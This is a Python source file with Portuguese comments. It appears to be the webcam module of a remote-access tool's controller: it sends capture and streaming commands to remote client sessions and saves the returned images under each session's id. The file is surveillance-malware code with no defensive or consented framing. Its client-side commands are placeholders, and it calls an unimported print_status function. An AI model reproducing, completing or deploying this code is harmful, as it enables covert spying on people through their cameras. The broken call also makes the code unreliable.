import base64
import os
from utils.helpers import print_success, print_error

class CameraModule:
    def __init__(self, server):
        self.server = server
        
    def capture(self, session_id, quality="medium", count=1):
        if session_id not in self.server.clients:
            print_error(f"Sessão não encontrada: {session_id}")
            return False
            
        # Comando para capturar imagem da câmera
        # Este é um exemplo simplificado - na prática, você precisaria
        # de um payload específico para cada plataforma
        
        if self.server.clients[session_id]['os'].lower().startswith('win'):
            # Comando para Windows
            command = f"camera_capture --quality {quality} --count {count}"
        elif self.server.clients[session_id]['os'].lower().startswith('linux'):
            # Comando para Linux
            command = f"camera_capture --quality {quality} --count {count}"
        else:
            print_error("Sistema operacional não suportado para captura de câmera")
            return False
            
        return self.server.send_command(session_id, f"camera:{command}")
        
    def stream(self, session_id, duration=10):
        if session_id not in self.server.clients:
            print_error(f"Sessão não encontrada: {session_id}")
            return False
            
        # Comando para streaming de câmera
        command = f"camera_stream --duration {duration}"
        return self.server.send_command(session_id, f"camera:{command}")
        
    def process_camera_data(self, session_id, data):
        # Processar dados recebidos da câmera
        if data.startswith("CAMERA_IMAGE:"):
            parts = data.split(":", 2)
            if len(parts) >= 3:
                filename = parts[1]
                image_data = parts[2]
                
                # Decodificar imagem base64
                try:
                    image_bytes = base64.b64decode(image_data)
                    
                    # Salvar imagem
                    camera_dir = "camera_captures"
                    os.makedirs(camera_dir, exist_ok=True)
                    
                    filepath = f"{camera_dir}/{session_id}_{filename}"
                    with open(filepath, "wb") as f:
                        f.write(image_bytes)
                        
                    print_success(f"Imagem salva: {filepath} ({len(image_bytes)} bytes)")
                    return True
                except Exception as e:
                    print_error(f"Erro ao processar imagem: {e}")
                    return False
                    
        elif data.startswith("CAMERA_STREAM:"):
            # Processar frame de streaming
            parts = data.split(":", 2)
            if len(parts) >= 3:
                frame_id = parts[1]
                frame_data = parts[2]
                
                # Em uma implementação real, você mostraria o streaming em tempo real
                print_status(f"Frame recebido: {frame_id}")
                return True
                
        return False
